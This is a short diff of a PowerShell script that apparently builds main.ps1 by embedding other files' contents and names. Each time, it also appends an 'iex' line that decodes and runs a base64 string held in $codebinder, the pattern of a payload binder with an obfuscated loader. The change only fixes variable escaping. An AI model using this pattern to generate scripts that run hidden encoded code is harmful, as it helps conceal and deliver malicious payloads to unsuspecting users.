@@ -26,8 +26,8 @@ foreach ($file in $files) {
     $fileName = $file.Name
 
     # Thêm nội dung vào main.ps1
-    Add-Content -Path "main.ps1" -Value "Filecontent = '$fileContent'"
-    Add-Content -Path "main.ps1" -Value "name = '$fileName'"
+    Add-Content -Path "main.ps1" -Value "`$Filecontent = '$fileContent'"
+    Add-Content -Path "main.ps1" -Value "`$name = '$fileName'"
     Add-Content -Path "main.ps1" -Value "iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$codebinder')))"
 }
 
